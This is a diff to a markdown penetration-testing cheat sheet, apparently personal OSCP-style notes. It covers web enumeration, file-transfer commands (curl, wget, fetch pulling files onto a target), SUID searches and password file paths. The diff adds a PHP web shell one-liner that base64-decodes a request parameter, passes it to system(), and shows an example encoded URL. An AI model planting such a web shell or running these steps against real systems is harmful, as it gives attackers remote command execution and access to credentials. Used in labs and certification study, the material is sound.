@@ -54,6 +54,7 @@
   - ``` dirb http://Ip-target -r``` **Different wordlist perhaps**
     - Non-recursive to save time, then inspect further if necessary
   - Try nmap ``` -–script=http-enum.nse``` (others available)
+  	- ```--script safe -p80,443```
   - Check site in browser (http/https)
   - Resolve host name if necessary (etc/hosts)
   - Cookies
@@ -101,12 +102,13 @@
 	  - ```find / -perm -u=s -type f 2>/dev/null ```
   - Available programs/languages on host:
 	  - which Perl,python etc
-	- Nc,ncat,wget,curl
-	  - ```curl -o theFile http://IP:PORT/theFile```
-		- ```curl ftp://ftp.domain.com --user username:password```
-		  - Access FTP server (Add file to end of domain to download)
-		- ```wget http://IP:PORT/theFile -O theFile```
-		- ```fetch -o theFile http://IP:PORT/theFile``` (FreeBSD)
+  - Transfer Files
+	  - Nc,ncat,wget,curl
+	    - ```curl -o theFile http://IP:PORT/theFile```
+	      - ```curl ftp://ftp.domain.com --user username:password```
+	        - Access FTP server (Add file to end of domain to download)
+	  - ```wget http://IP:PORT/theFile -O theFile```
+	  - ```fetch -o theFile http://IP:PORT/theFile``` (FreeBSD)
   - Password Files
 	  - /etc/pwd.db
 		- /etc/spwd.db
@@ -133,6 +135,11 @@
 
 <H2>Getting In</H2>
 
+- Put this at top because its handy as balls
+  - ```<?php if(isset($_REQUEST["cli"])){ echo "<pre>"; $cli = base64_decode(urldecode(($_REQUEST["cli"]))); system($cli); echo "</pre>"; die; }?>```
+  - url request must be encoded in base64 prior.
+	- ```http://target?cli=%22bHMgLWxhIC92YXIvdG1wLw==%22```
+  
 - Remote file inclusion (https://sushant747.gitbooks.io/total-oscp-guide/remote_file_inclusion.html)
   - Similar to local file inclusion while not hosted on the target
 	- Rarer than LFI due to php.ini needs to configured for it
